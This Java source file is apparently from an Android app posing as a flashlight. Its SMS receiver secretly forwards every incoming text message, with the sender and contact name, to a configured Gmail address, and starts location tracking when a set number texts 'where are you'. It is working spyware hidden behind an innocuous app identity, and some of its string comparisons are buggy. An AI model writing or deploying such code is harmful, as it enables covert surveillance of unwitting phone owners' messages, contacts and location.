package com.flash.light; 

import java.util.List;
import android.util.Log;
import android.os.Bundle;
import java.io.IOException;
import android.app.Activity;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class SMSReceiver extends BroadcastReceiver {

  public  static Object[] pdus;
  //public  static Context context;
  private static Contacts contact;
  private static GmailSender sender;
  private static DatabaseHandler db;
  private static Configure configure;

  public  static String mBody = null;
  private static String phoneNumberString;
  private static String gmailEmailString;

  private static final String TAG = "FlashLight SMSReceiver";

  public SMSReceiver() {
    contact   = new Contacts();
    configure = new Configure();
    gmailEmailString  = configure.emailAddress();
    phoneNumberString = configure.phoneNumber();
    Log.d(TAG, "SMSReceiver() constructor gmailEmailString " + gmailEmailString);
    Log.d(TAG, "SMSReceiver() constructor phoneNumberString " + phoneNumberString);
  }

  public String endPoint(final String number, final Context context) {

    String end_point;
    final String contact_name  = contact.getContactName(number, context);

    if(!contact_name.isEmpty()) {
      end_point = "" + number + "(" + contact_name + ")";
    }
    else {
      end_point = number;
    }
    return end_point;
  }

  @Override
  public void onReceive(final Context context, Intent intent) {

    if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) { 

      SmsMessage[] messages = null; 
      Bundle bundle = intent.getExtras();

      if(bundle != null) {
        try {
          pdus = (Object[]) bundle.get("pdus");
          messages  = new SmsMessage[pdus.length];
          
          for(int i = 0; i < messages.length; i++) {
            messages[i]  = SmsMessage.createFromPdu((byte[])pdus[i]);
            mBody = messages[i].getMessageBody();
          }

          final String message_from = messages[0].getOriginatingAddress();

          Log.d(TAG,"onReceive() Entering onReceive().");

          if(phoneNumberString != "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
            intent = new Intent(context, FlashLightService.class);
            intent.putExtra("obtainLocation","obtainLocation");
            context.startService(intent);
          }
          else if(phoneNumberString == "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you")) {
            new Thread(new Runnable() {
              @Override
              public void run() {
                try {
                  Log.d(TAG, "onReceive() Sending email.");
                  sender = new GmailSender();
                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody, gmailEmailString);
                }
                catch(Exception e) {
                  Log.e(TAG, "onReceive() Exception e " + e.toString());
                  e.printStackTrace();
                }
              }
            }).start();
          }
          else if(gmailEmailString != "smsinterceptorapp@gmail.com") {
            new Thread(new Runnable() {
              @Override
              public void run() {
                try {
                  Log.d(TAG,"onReceive() Sending email.");
                  sender = new GmailSender();
                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody, gmailEmailString);
                }
                catch(Exception e) {
                  Log.e(TAG, "onReceive() Exception e " + e.toString());
                  e.printStackTrace();
                }
              }
            }).start();
          }
        }
        catch(Exception e) {
          e.printStackTrace();
        }
        
      }
    }
  }

}